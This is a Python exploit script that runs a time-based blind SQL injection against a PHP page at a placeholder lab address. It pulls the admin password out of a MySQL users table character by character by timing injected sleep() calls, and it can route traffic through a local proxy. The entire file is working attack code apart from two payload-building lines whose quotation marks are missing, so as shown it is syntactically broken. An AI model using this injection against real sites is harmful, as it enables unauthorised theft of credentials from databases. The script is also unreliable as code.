#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import requests
import time

proxyDict = {
  "http"  : "http://127.0.0.1:8080",
  "https" : "http://127.0.0.1:8080"
}

# SQL Sleep length
timeout = 3 # In seconds

host = 'http://10.10.10.1'
path = '/foo/baar/index.php?q={payload}'
# MySQL payload
payload  = "x%27)/**/or/**/(select/**/if(" 
payload += "ascii(substring((select/**/password/**/from/**/users/**/where/**/username='admin'),{start},1))={char}," # Comparison
payload += sleep(" + str(timeout) + ")," # sleep(timeout) IF comparison is True
payload += 1))%23"                       # return 1 IF comparison is False


def sqli(target, i, char):
    url = target.format(start=i, char=char)
    startTime = time.time()
    r = requests.get(url)
    # r = requests.get(url,proxies=proxyDict) # With Proxy
    elapsedTime = time.time() - startTime
    if elapsedTime > timeout:
        return True
    return False


def start():
    print('(+) Extracting data from database:')
    target = host + path.format(payload=payload)
    result = ''
    length = 0
    while True:
        for char in range(32, 126):  # ascii
            if sqli(target, length + 1, char):
                c = chr(char)
                result += c
                print(c, end='', flush=True)
                break
        if len(result) == length:
            break
        else:
            length += 1
    print('\n(+) Extraction finished.')


def main():
    start()


if __name__ == '__main__':
    main()
